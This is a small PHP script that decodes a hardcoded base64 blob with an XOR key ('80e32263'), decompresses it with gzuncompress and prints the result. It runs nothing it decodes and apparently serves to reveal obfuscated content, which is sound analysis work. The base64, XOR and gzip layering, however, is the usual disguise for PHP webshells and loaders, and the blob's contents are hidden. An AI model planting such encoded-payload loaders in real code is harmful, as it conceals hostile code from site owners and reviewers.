<?php

$k= "80e32263";

function x($t, $k) {
    $c = strlen($k);
    $l = strlen($t);
    $o = "";

    for ( $i = 0; $i < $l ;) { 
        for ( $j = 0 ; ($j < $c && $i < $l); $j++, $i++) {
            $o .= $t[$i] ^ $k[$j];
        }
    }

    return $o;
}

$enc = "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";
$b64_decode = base64_decode($enc);
$xed = x($b64_decode, $k);
$gzun = gzuncompress($xed);
print_r($gzun);

?>